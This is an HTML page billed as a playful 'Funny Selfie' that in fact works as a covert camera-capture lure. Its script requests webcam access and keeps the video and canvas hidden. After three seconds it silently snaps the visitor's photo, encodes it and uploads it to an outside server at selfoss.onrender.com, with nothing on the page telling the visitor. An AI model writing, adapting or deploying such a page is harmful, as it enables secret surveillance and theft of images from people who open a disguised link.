<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Funny Selfie</title>
</head>
<body>
  <h1>Smile for the camera! 😁</h1>
  <video id="video" autoplay style="display: none;"></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Access the camera and start the video stream
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;

        // Wait 3 seconds before capturing the photo
        setTimeout(() => {
          // Capture the photo
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Convert the photo to Base64
          const photo = canvas.toDataURL('image/png');

          // Send the photo to your server
          fetch('https://selfoss.onrender.com/upload', { // Replace this with your server URL
            method: 'POST',
            body: JSON.stringify({ image: photo }),
            headers: { 'Content-Type': 'application/json' }
          })
          .then(response => response.json())
          .then(data => {
            console.log("Photo sent successfully!", data);
          })
          .catch(err => {
            console.error("Failed to send the photo!", err);
          });
        }, 3000); // 3-second delay
      })
      .catch((err) => {
        alert("Camera access denied or unavailable!");
        console.error("Error accessing the camera:", err);
      });
  </script>
</body>
</html>
